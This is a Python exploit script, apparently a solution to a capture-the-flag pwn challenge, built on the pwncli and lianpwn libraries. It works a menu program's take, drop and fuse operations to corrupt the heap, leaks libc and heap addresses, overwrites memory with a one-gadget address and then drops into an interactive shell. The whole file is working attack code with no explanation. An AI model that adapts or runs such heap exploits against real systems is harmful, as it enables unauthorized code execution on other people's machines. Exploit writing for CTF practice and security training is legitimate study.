#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"> ")
    sl(i2b(choice))


def takeRuby(name):
    cmd(1)
    ru(b"Sign the name of the new owner here:\n")
    sl(name)


def dropRuby():
    cmd(2)


def takeRod(name):
    cmd(3)
    ru(b"Sign the name of the new owner here:\n")
    sl(name)


def dropRod():
    cmd(4)


def fuse(name):
    cmd(5)
    ru(b"Sign the name of the one who wants to fuse this new weapon here:\n")
    sl(name)


def dropWeapon():
    cmd(6)


def leave():
    cmd(7)


def gc():
    cmd(8)


for i in range(9):
    takeRod(b"a" * 0x400)
takeRuby(p64(0x41D470))
fuse(b"a")

for i in range(8):
    dropRod()


takeRod(b"a" * 0x490)
takeRuby(p64(0x41D470))
fuse(b"a" * 0x448)
dropWeapon()

fuse(b"a")
dropWeapon()
dropRuby()
takeRuby(b"a")
fuse(b"b")
ru(b"Rod:     ")
libc_base = u64_ex(rn(8)) - 0x1EC0B0
heap_base = u64_ex(rn(8))
lg("libc_base", libc_base)
lg("heap_base", heap_base)

takeRod(p64(libc_base + 0xE6AEE) * 0x10)
takeRuby(p64(heap_base - 0x1BD0))
fuse(p64(0xCAFECAFE) * 0x10)
dropWeapon()

for i in range(6):
    gc()

ia()
